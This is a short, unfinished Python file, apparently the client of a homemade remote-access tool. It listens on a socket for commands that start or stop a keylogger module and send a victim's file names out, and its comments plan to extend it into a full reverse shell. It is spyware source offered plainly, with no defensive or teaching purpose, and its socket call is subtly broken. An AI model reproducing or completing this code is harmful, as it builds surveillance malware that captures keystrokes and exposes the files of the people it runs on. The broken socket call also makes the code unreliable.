import socket
import userscanner
import keylogger

# TODO finish a client command structure
""" 
    This will await commands from the server something like a reverse shell
    When the server sends a show file request this will call the userscanner function
    We can extend this to full on reverse shell in the future
"""
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as main_s:
        main_s.bind("127.0.0.1", 666)
        main_s.listen()
        conn, addr = main_s.accept()
        with conn:
            while True:
                data = conn.recv(128).decode("utf-8") 
                # The command section:
                match data:
                    case "run -keylogger":
                        keylogger.start_keylogger(True)
                    case "stop -keylogger":
                        keylogger.start_keylogger(False)
                    case "run -getFileNames":
                        userscanner.sendFiles()
                        
                        
